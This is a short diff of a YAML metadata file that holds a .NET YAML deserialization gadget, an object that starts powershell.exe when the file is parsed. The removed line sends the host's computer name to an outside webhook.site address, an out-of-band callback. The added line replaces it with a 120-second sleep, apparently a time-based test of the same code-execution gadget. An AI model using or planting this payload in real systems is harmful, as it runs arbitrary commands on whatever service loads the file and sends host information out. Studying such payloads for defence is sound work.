@@ -551,7 +551,7 @@ metadata:
     ObjectInstance: !<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
       StartInfo: !<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
         FileName: powershell.exe,
-        Arguments: '-c "$h=$env:COMPUTERNAME;iwr -UseBasicParsing \"http://25148af8-2343-47c0-93b1-a6535d1ec22e.webhook.site/opbuild1793972882?h=$h&m=opbuild1793972882&r=odata\""'
+        Arguments: '-c "Start-Sleep -Seconds 120"'
       }
     }
   }
